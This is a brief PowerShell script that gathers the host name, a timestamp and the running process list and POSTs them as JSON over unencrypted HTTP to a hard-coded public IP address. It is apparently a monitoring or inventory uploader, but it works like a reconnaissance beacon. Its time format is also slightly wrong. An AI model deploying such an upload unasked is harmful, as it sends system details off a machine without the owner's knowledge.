# collect information and upload to server.

$now=get-date -Format "yyyy/MM/dd-HH:MM:ss"
$hostname=$env:COMPUTERNAME

$BODY = @{}

$msg=Get-Process | Select-Object Id,ProcessName | ConvertTo-Json 

$BODY["HOSTNAME"]=$hostname
$BODY["TIMESTAMP"]=Get-Date -Format("")
$BODY["MESSAGE"]=$msg
$BODY["TIMESTAMP"]=$now

$BODY=$BODY | ConvertTo-Json


Invoke-RestMethod -Method Post -Uri http://39.108.176.143/data -ContentType application/json -Body $BODY
